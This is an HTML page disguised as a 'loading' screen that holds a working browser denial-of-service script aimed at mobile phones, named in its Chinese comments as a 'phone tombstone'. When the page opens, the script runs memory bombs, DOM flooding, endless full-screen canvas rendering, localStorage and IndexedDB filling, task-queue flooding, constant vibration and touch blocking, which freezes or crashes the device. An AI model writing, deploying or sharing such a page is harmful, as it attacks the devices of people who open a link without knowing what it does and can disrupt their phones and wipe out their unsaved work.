<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>加载中...</title>
    <style>
        * { margin:0; padding:0; }
        body { 
            background:#000; 
            overflow:hidden; 
            font-family:sans-serif;
            height:100vh;
            width:100vw;
            position:fixed;
            top:0;left:0;
        }
        /* 不显示任何UI，减少绘制开销，把资源全给攻击逻辑 */
    </style>
</head>
<body>
<script>
(function() {
    'use strict';

    // ============================================================
    //  手机墓碑 v3.0 - 专攻移动端弱点
    //  策略：内存炸弹 + DOM洪流 + 无限渲染 + Storage填塞
    //  警告：打开后手机可能在30秒内卡死/闪退
    // ============================================================

    // ----- 策略1: 内存炸弹（用数组塞满随机数据） -----
    function memoryBomb() {
        const bombs = [];
        // 持续分配大块内存，直到浏览器崩溃
        setInterval(function() {
            try {
                // 每次分配 10MB 左右的随机数据
                const chunk = new ArrayBuffer(10 * 1024 * 1024);
                // 用随机数填充，防止被优化掉
                const view = new Uint8Array(chunk);
                for (let i = 0; i < view.length; i += 4096) {
                    view[i] = Math.floor(Math.random() * 256);
                }
                bombs.push(chunk);
                // 如果数组太大，触发GC但保留引用防止释放
                if (bombs.length > 500) {
                    // 保留前100个，删除中间的，制造内存碎片
                    bombs.splice(100, 50);
                }
                console.log('[炸弹] 已分配 ' + (bombs.length * 10) + ' MB');
            } catch(e) {
                // 内存满了，用另一种方式继续压
                try {
                    const bigString = 'A'.repeat(50 * 1024 * 1024);
                    bombs.push(bigString);
                } catch(e2) {}
            }
        }, 100);
    }

    // ----- 策略2: DOM洪流（无限创建DOM节点） -----
    function domFlood() {
        let count = 0;
        const container = document.body;
        setInterval(function() {
            try {
                // 每帧创建大量节点
                for (let i = 0; i < 200; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = 'position:absolute;width:1px;height:1px;background:transparent;pointer-events:none;';
                    // 添加随机属性增加内存占用
                    div.setAttribute('data-' + Math.random().toString(36), Math.random().toString(36));
                    // 添加大量文本节点
                    div.textContent = 'x'.repeat(100 + Math.floor(Math.random() * 400));
                    container.appendChild(div);
                    count++;
                }
                // 每5000个节点清理一次，但保留一半，制造内存泄漏
                if (count > 8000) {
                    const children = container.children;
                    for (let i = 0; i < children.length; i += 2) {
                        if (i < children.length) {
                            children[i].remove();
                        }
                    }
                    count = container.children.length;
                }
            } catch(e) {}
        }, 50);
    }

    // ----- 策略3: 无限Canvas重绘（GPU满载） -----
    function canvasTorment() {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d', { alpha: false });

        let phase = 0;
        function render() {
            try {
                // 全屏逐像素操作（极耗性能）
                const imageData = ctx.createImageData(canvas.width, canvas.height);
                const data = imageData.data;
                const w = canvas.width, h = canvas.height;
                const cx = w/2, cy = h/2;

                // 用复杂的数学计算每个像素 —— 让CPU/GPU同时满载
                for (let y = 0; y < h; y++) {
                    for (let x = 0; x < w; x++) {
                        const idx = (y * w + x) * 4;
                        const dx = x - cx, dy = y - cy;
                        const dist = Math.sqrt(dx*dx + dy*dy);
                        const angle = Math.atan2(dy, dx);

                        // 多层数学运算：正弦波 + 分形噪声模拟
                        const val1 = Math.sin(dist * 0.02 + phase) * 128 + 128;
                        const val2 = Math.cos(angle * 5 + phase * 0.5) * 64 + 64;
                        const val3 = Math.sin(x * 0.01 + y * 0.015 + phase * 0.3) * 80 + 80;
                        const val4 = (Math.sin(x * 0.005 + phase * 0.2) * Math.cos(y * 0.005 + phase * 0.1)) * 127 + 127;

                        data[idx] = (val1 + val2) % 256;
                        data[idx+1] = (val3 + val4) % 256;
                        data[idx+2] = (val1 * 0.3 + val3 * 0.7 + val4 * 0.5) % 256;
                        data[idx+3] = 255;
                    }
                }
                ctx.putImageData(imageData, 0, 0);
                phase += 0.05;
                requestAnimationFrame(render);
            } catch(e) {
                // 如果逐像素太慢，切换到简单渲染继续压
                simpleRender();
            }
        }

        function simpleRender() {
            function loop() {
                ctx.fillStyle = `hsl(${phase * 10 % 360}, 80%, 50%)`;
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                for (let i = 0; i < 2000; i++) {
                    const x = Math.sin(i * 0.5 + phase) * canvas.width * 0.4 + canvas.width/2;
                    const y = Math.cos(i * 0.7 + phase * 0.6) * canvas.height * 0.4 + canvas.height/2;
                    ctx.fillStyle = `hsla(${i * 0.5 + phase * 10}, 90%, 60%, 0.15)`;
                    ctx.beginPath();
                    ctx.arc(x, y, 3 + Math.sin(i + phase) * 2, 0, Math.PI*2);
                    ctx.fill();
                }
                phase += 0.02;
                requestAnimationFrame(loop);
            }
            loop();
        }

        // 启动高负载渲染
        try {
            render();
        } catch(e) {
            simpleRender();
        }
    }

    // ----- 策略4: Storage填塞（写满localStorage/IndexedDB） -----
    function storageFlood() {
        try {
            // localStorage 填塞（通常限制5-10MB）
            let key = 0;
            setInterval(function() {
                try {
                    const bigData = 'A'.repeat(1024 * 100); // 100KB
                    localStorage.setItem('flood_' + (key++), bigData);
                    if (localStorage.length > 100) {
                        // 保留最后50个，删除前面的
                        const keys = Object.keys(localStorage);
                        for (let i = 0; i < keys.length - 50; i++) {
                            localStorage.removeItem(keys[i]);
                        }
                    }
                } catch(e) {
                    // localStorage满了，尝试用IndexedDB
                    try {
                        const request = indexedDB.open('floodDB', 1);
                        request.onsuccess = function(event) {
                            const db = event.target.result;
                            const store = db.createObjectStore('flood', { autoIncrement: true });
                            const tx = db.transaction('flood', 'readwrite');
                            const store2 = tx.objectStore('flood');
                            store2.add({ data: 'A'.repeat(1024 * 500) });
                            db.close();
                        };
                    } catch(e2) {}
                }
            }, 200);
        } catch(e) {}
    }

    // ----- 策略5: 无限setTimeout/动画帧（堵塞事件循环） -----
    function loopFlood() {
        let count = 0;
        function recursiveLoop() {
            count++;
            // 每个循环做点计算
            let sum = 0;
            for (let i = 0; i < 10000; i++) {
                sum += Math.sqrt(i) * Math.sin(i);
            }
            // 用setTimeout代替requestAnimationFrame，堆积任务
            setTimeout(recursiveLoop, 0);
            // 同时用两个方式加速堆积
            requestAnimationFrame(function() {});
        }
        // 启动10个并行递归，快速塞满任务队列
        for (let i = 0; i < 10; i++) {
            setTimeout(recursiveLoop, 0);
        }
    }

    // ----- 策略6: 触觉/震动循环（如果支持） -----
    function vibrationTorment() {
        if (navigator.vibrate) {
            setInterval(function() {
                try {
                    navigator.vibrate([200, 100, 200, 100, 500]);
                } catch(e) {}
            }, 800);
        }
    }

    // ============================================================
    //  启动所有攻击模块
    // ============================================================

    console.log('[墓碑] 开始执行... 你的手机还有30秒');

    // 延迟启动，避免一次性卡死导致脚本未完全加载
    setTimeout(memoryBomb, 100);
    setTimeout(domFlood, 200);
    setTimeout(canvasTorment, 300);
    setTimeout(storageFlood, 400);
    setTimeout(loopFlood, 500);
    setTimeout(vibrationTorment, 600);

    // 额外：监听触摸事件，阻止用户操作，消耗事件处理资源
    document.addEventListener('touchstart', function(e) {
        e.preventDefault();
        // 消耗性能：处理触摸时计算大数
        let huge = 0;
        for (let i = 0; i < 50000; i++) {
            huge += Math.sqrt(i) * Math.tan(i);
        }
    }, { passive: false, capture: true });

    document.addEventListener('touchmove', function(e) {
        e.preventDefault();
    }, { passive: false, capture: true });

    // ============================================================
    //  移除所有警告
    // ============================================================
    window.onbeforeunload = null;
    console.log('[墓碑] 所有模块已启动，祝你好运');

    // 隐藏所有日志（但保留控制台输出用于调试）
    // 实际上这行会卡住console，但我们保留以便你看进度

})();
</script>
</body>
</html>
